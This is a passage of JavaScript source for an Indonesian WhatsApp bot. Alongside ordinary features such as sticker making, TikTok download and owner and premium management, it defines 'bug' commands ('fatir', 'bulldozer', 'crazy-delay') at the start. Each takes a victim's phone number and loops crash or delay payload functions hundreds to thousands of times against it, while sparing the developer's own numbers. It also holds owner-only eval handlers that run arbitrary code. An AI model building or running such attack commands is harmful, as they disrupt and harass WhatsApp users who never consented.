    video: fs.readFileSync('./media/bug.mp4'),
    caption: prosesText,
    gifPlayback: true,
  }, { quoted: qkontak });

  for (let i = 0; i <  2000; i++) {
    await necroxenui(target)
    await sleep(1000)
}


  const selesaiText = `╔═━━「 𝗦𝘂𝗰𝗰𝗲𝘀 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`;

  await asep.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: selesaiText,
    gifPlayback: true,
  }, { quoted: qkontak });
}
break;

case 'fatir': {
  if (!isPremium) return necroxenreply('⚡︎ Fitur khusus Premium!');
  if (!isOwner) return necroxenreply('⚡︎ Fitur khusus Owner!');

  if (!q) return m.reply(`Contoh: ${prefix + command} 62xxxx`);
  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const pureTarget = target.split("@")[0]; // Ambil hanya angkanya

  if (blockedNum.includes(pureTarget)) return m.reply("mau ngapain bug dev dek 😹")

  const prosesText = `╔═━━「 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`;

  await asep.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: prosesText,
    gifPlayback: true,
  }, { quoted: qkontak });

  for (let i = 0; i <  1; i++) {
    await sleep(5000)
}


  const selesaiText = `╔═━━「 𝗦𝘂𝗰𝗰𝗲𝘀 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`;

  await asep.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: selesaiText,
    gifPlayback: true,
  }, { quoted: qkontak });
}
break;

case 'crazy-delay':
case 'delayftr':
case 'mampus':
case 'reflaybulldozer':
case 'bulldozer':
case 'buldozer': {
  if (!isPremium) return necroxenreply('⚡︎ Fitur khusus Premium!');
  if (!isOwner) return necroxenreply('⚡︎ Fitur khusus Owner!');

  if (!q) return m.reply(`Contoh: ${prefix + command} 62xxxx`);
  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const pureTarget = target.split("@")[0]; // Ambil hanya angkanya

  if (blockedNum.includes(pureTarget)) return m.reply("mau ngapain bug dev dek 😹")

  const prosesText = `╔═━━「 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`;

  await asep.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: prosesText,
    gifPlayback: true,
  }, { quoted: qkontak });

  for (let i = 0; i <  800; i++) {
    await necroxenbull(target);
    await necroxeneasy(target);
}


  const selesaiText = `╔═━━「 𝗦𝘂𝗰𝗲𝘀𝘀 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`;

  await asep.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: selesaiText,
    gifPlayback: true,
  }, { quoted: qkontak });
}
break;

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "ht":
case "hidetag":
case "h": {
    if (!m.isGroup) return m.reply(msg.group);
    if (!isOwner && !m.isAdmin) return m.reply(msg.admin);
    if (!text) return m.reply(example("pesannya"));

    // Ambil metadata grup dulu
    const metadata = await asep.groupMetadata(m.chat);
    const member = metadata.participants.map(v => v.id);

    await asep.sendMessage(m.chat, {
        text: text,
        mentions: member
    }, { quoted: qkontak });
}
break;
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
 case "addowner": case "addown": {
if (!isOwner) return necroxenreply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (owner2.includes(orang) || orang == global.owner) return necroxenreply(`Nomor ${orang.split("@")[0]} Sudah Ada Di Database Owner`)
if (orang == botNumber) return necroxenreply("Tidak Bisa Menambahkan Nomor Bot Kedalam Database Owner Tambahan!")
let check = await asep.onWhatsApp(`${orang.split("@")[0]}`)
if (check.length < 1) return necroxenreply(`Nomor ${orang.split("@")[0]} Tidak Terdaftar Di WhatsApp`)
await owner2.push(orang)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
necroxenreply(`*Berhasil Menambah Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Ditambahkan Kedalam Database Owner`)
} else {
necroxenreply(example("@tag/6283XXX"))
}
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "delowner": case "delown": {
if (!isOwner) return necroxenreply(msg.owner)
if (m.quoted || text) {
if (text == "all") {
await fs.writeFileSync("./database/owner.json", "[]")
return necroxenreply(`*Berhasil Menghapus Semua Owner Tambahan ✅*`)
}
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!owner2.includes(orang) || orang == global.owner) return necroxenreply(`Nomor ${orang.split("@")[0]} Tidak Ada Di Database Owner`)
if (orang == botNumber) return necroxenreply("Tidak Bisa Menghapus Nomor Bot!")
let pos = owner2.indexOf(orang)
await owner2.splice(pos, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
m.reply(`*Berhasil Menghapus Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Dihapus Dari Database Owner`)
} else {
necroxenreply(example("@tag/6283XXX"))
}
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "addprem": case "addpremium": {
if (!isOwner) return necroxenreply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (premium.includes(orang)) return necroxenreply(`*Gagal Menambah User Premium!*\n${orang.split('@')[0]} Sudah Terdaftar Di Database *User Premium*`)
await premium.push(orang)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
necroxenreply(`*Berhasil Menambah Premium ✅*\n${orang.split('@')[0]} Sekarang Terdaftar Di Database *User Premium*`)
} else {
return necroxenreply(example("@tag/62838XXX"))
}}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "delprem": case "delpremium": {
if (!isOwner) return necroxenreply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!premium.includes(orang)) return necroxenreply(`*Gagal Menghapus User Premium!*\n${orang.split('@')[0]} Tidak Terdaftar Di Database *User Premium*`)
let indx = premium.indexOf(orang)
await premium.splice(indx, 1)
await fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
necroxenreply(`*Berhasil Menghapus Premium ✅*\n${orang.split('@')[0]} Sekarang Terhapus Dari Database *User Premium*`)
} else {
return necroxenreply(example("@tag/62838XXX"))
}}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "public": case "publik": {
if (!isOwner) return necroxenreply(msg.owner)
asep.public = true
necroxenreply("Successfully changed bot mode to public")
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "self": case "private": case "priv": case "prib": {
if (!isOwner) return necroxenreply(msg.owner)
asep.public = false
necroxenreply("Successfully changed bot mode to private")
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "cekidch": case "idch": {
   if (!text) return m.reply(example("linkchnya"))
   if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
   let result = text.split('https://whatsapp.com/channel/')[1]
   let res = await asep.newsletterMetadata("invite", result)
   let teks = `${res.id}
   
   * ${res.name}
   * ${res.subscribers} Pengikut`
   return m.reply(teks)
   }
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "reactch":
case "rch": {
    if (!isOwner) return m.reply(msg.owner);
    if (!text) return m.reply("Contoh:\n.rch https://whatsapp.com/channel/xxx/123 flux nih bos");

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    try {
        const [mainText, offsetStr] = text.split('|');
        const args = mainText.trim().split(" ");
        const link = args[0];

        if (!/^https:\/\/whatsapp\.com\/channel\//.test(link)) {
            return m.reply("❌ Link tidak valid!\nContoh: .reactch https://whatsapp.com/channel/xxx/idpesan ❤biyu|3");
        }

        const parts = link.split('/');
        const channelId = parts[4];
        const rawMessageId = parseInt(parts[5]);
        if (!channelId || isNaN(rawMessageId)) return m.reply("❌ Link tidak lengkap!");

        const offset = parseInt(offsetStr?.trim()) || 1;
        const teksNormal = args.slice(1).join(' ');
        const teksTanpaLink = teksNormal.replace(link, '').trim();
        if (!teksTanpaLink) return m.reply("❌ Masukkan teks/emoji untuk direaksikan.");

        const emoji = teksTanpaLink.toLowerCase().split('').map(c => {
            if (c === ' ') return '―';
            return hurufGaya[c] || c;
        }).join('');

        const metadata = await asep.newsletterMetadata("invite", channelId);

        let success = 0, failed = 0;
        for (let i = 0; i < offset; i++) {
            const msgId = (rawMessageId - i).toString();
            try {
                await asep.newsletterReactMessage(metadata.id, msgId, emoji);
                success++;
            } catch (e) {
                console.error(`Gagal reaction ke pesan ID ${msgId}:`, e);
                failed++;
            }
        }

        m.reply(`✅ Berhasil kirim reaction *${emoji}* ke ${success} pesan di channel *${metadata.name}*\n❌ Gagal di ${failed} pesan`);
    } catch (err) {
        console.error("Error reactch:", err);
        m.reply("❌ Gagal memproses permintaan!");
    }
}
break;
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case 'play': {
  if (!isOwner) return necroxenreply('khusus owner njrr')
  if (!text) return m.reply('Masukkan judul lagu!\nContoh: *play Jakarta Hari Ini*');

  try {
    const res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
    if (!res.ok) return m.reply('Gagal mengambil data dari server.');
    const data = await res.json();
    if (!data.status || !data.result) return m.reply('Lagu tidak ditemukan!');
    const { title, channel, duration, imageUrl, link } = data.result.metadata;
    const downloadUrl = data.result.downloadUrl;
    const thumbnail = await (await fetch(imageUrl)).buffer();
    await asep.sendMessage(m.chat, {
      audio: { url: downloadUrl },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: title,
          body: `${channel} • ${duration}`,
          thumbnail,
          mediaUrl: link,
          mediaType: 2,
          renderLargerThumbnail: true,
          sourceUrl: link
        }
      }
    }, { quoted: qkontak });
  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan saat memproses permintaanmu.');
  }
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case 'tourl': {
  try {
    const quoted = m.quoted || m;

    if (!quoted.mtype || !/imageMessage|videoMessage|audioMessage/.test(quoted.mtype)) {
      return m.reply(`⚡︎ Kirim atau reply gambar, video, atau audio dengan caption *${prefix + command}*`);
    }

    const buffer = await quoted.download();
    const fileName = `./tmp-${Date.now()}.jpg`; // opsional: ganti sesuai mime-type
    fs.writeFileSync(fileName, buffer);

    const url = await CatBox(fileName);
    const fileSize = (fs.statSync(fileName).size / 1024).toFixed(2);

    await m.reply(
      `ᴜᴋᴜʀᴀɴ ғɪʟᴇ : ${fileSize} ᴋʙ\nᴘᴇɴɢᴜɴɢɢᴀʜ : ${pushname}\nᴜʀʟ : ${url}`
    );

    fs.unlinkSync(fileName);
  } catch (err) {
    console.error("ERROR:", err);
    m.reply("⚡︎ Terjadi kesalahan saat mengunggah file.");
  }
}
break;


// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'cquote':
case 'createquote': {
 if (!text) return m.reply(`*Cara pakai fitur Quote:*\n\nKetik:\n*createquote teks | username | tanda tangan | ppUrl*\n\nContoh tanpa ppUrl (otomatis pakai foto profil kamu):\ncreatequote Aku semangat! | Biyu | Official\n\nContoh dengan gambar custom:\ncreatequote Semangat terus! | Biyu | Admin | https:/xxxxxx.jpg`)

 let [isi, usern = '', sign = '', ppUrl = ''] = text.split("|").map(v => v.trim())
 if (!isi) return m.reply('Teks quote tidak boleh kosong.')
 if (!ppUrl) {
 ppUrl = await asep.profilePictureUrl(m.sender, 'image').catch(() => 'https://files.catbox.moe/idj484.jpg')
 }
 let url = `https://fastrestapis.fasturl.cloud/maker/quote?text=${encodeURIComponent(isi)}&username=${encodeURIComponent(usern)}&ppUrl=${encodeURIComponent(ppUrl)}&signature=${encodeURIComponent(sign)}`
 
 try {
 asep.sendMessage(m.chat, { image: { url }, caption: "Berhasil dibuat!" }, { quoted: m })
 } catch (e) {
 console.log('Gagal kirim quote:', e)
 m.reply('Gagal membuat quote, coba lagi nanti.')
 }
}
break

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case 'tt': case 'ttslide': case 'tiktok': {
if (!text) return m.reply("mana url nya?")
if (!text.startsWith("https://")) return m.reply("mana url nya?")
await tiktokDl(q).then(async (result) => {
m.reply(`⚡︎ Proses Mendownload...`)
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: asep.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Done Lek*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: ftoko})
await asep.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await asep.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Done Lek*`}, {quoted: qkontak})
}
}).catch(e => console.log(e))
await asep.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //

case 'brat': {
  const text = q;
  if (!text) return m.reply("mana teks nya?")

  const imageUrl = `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`;
  const inputPath = path.join(__dirname, "temp_image.jpg");
  const outputPath = path.join(__dirname, "sticker.webp");

  try {
    const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
    fs.writeFileSync(inputPath, response.data);

    exec(`ffmpeg -i ${inputPath} -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 ${outputPath}`, async (error) => {
      if (error) {
        console.error("❌ Gagal mengonversi gambar:", error);
        return asep.sendMessage(m.chat, {
          text: `⚡︎ Gagal membuat stiker. Coba lagi nanti.`,
        }, { quoted: qkontak });
      }

      await asep.sendMessage(m.chat, {
        sticker: fs.readFileSync(outputPath),
      }, { quoted: qkontak });

      fs.unlinkSync(inputPath);
      fs.unlinkSync(outputPath);
    });
  } catch (error) {
    console.error("❌ Gagal membuat stiker:", error);
    await asep.sendMessage(m.chat, {
      text: `⚡︎ Terjadi kesalahan saat memproses fitur brat.`,
    }, { quoted: qkontak });
  }
}
break;

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //

case 'stiker':
case 'sticker':
case 's': {
  if (!m.quoted && !m.message.imageMessage && !m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage)
    return m.reply(`Kirim gambar dengan caption *${prefix + command}* atau reply gambar dengan *${prefix + command}*`);

  let quoted = m.quoted ? m.quoted : m;
  let mime = (quoted.msg || quoted).mimetype || '';

  if (!/image/.test(mime))
    return m.reply(`File bukan gambar.`);

  const mediaBuffer = await quoted.download();
  const inputPath = path.join(__dirname, 'temp', `input_${Date.now()}.jpg`);
  const outputPath = path.join(__dirname, 'temp', `output_${Date.now()}.webp`);

  // Simpan file
  fs.writeFileSync(inputPath, mediaBuffer);

  exec(`ffmpeg -i ${inputPath} -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 ${outputPath}`, async (err) => {
    if (err) {
      console.error(err);
      m.reply('❌ Gagal membuat stiker.');
      fs.unlinkSync(inputPath);
      return;
    }

    await asep.sendMessage(m.chat, {
      sticker: fs.readFileSync(outputPath)
    }, { quoted: m });

    fs.unlinkSync(inputPath);
    fs.unlinkSync(outputPath);
  });
}
break;

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //

default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (m.text.toLowerCase() == "bot") {
   m.reply(`ʙᴏᴛ ᴅᴏᴍᴀɪɴ ᴀsᴇᴘ ᴏɴ`)
}
if (m.text.toLowerCase() == "tes") {
   m.reply(`ʙᴏᴛ ᴅᴏᴍᴀɪɴ ᴀsᴇᴘ ᴏɴ `)
}


if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
